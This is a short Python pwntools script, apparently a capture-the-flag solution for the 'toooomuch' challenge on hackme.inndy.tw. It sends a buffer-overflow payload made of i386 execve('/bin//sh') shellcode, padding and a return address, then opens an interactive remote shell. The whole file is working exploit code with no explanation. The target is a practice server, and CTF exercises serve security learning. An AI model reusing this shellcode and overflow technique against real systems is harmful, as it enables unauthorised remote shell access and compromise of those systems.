#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='i386', os='linux')
_ATT = 0
_local = 0

host = "hackme.inndy.tw"
port = "7702"

if _local:
	r = process('./toooomuch')
else:
	r = remote(host, port)

if _ATT:
	log.info('Waiting for attach...')
	raw_input()

data = 0x8049c60

payload = "\xb0\x0b\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"
payload += 'A' * (28-22)
payload += p32(data)


print r. recvuntil(':')
r.sendline(payload)
# print r.recv()
r.interactive()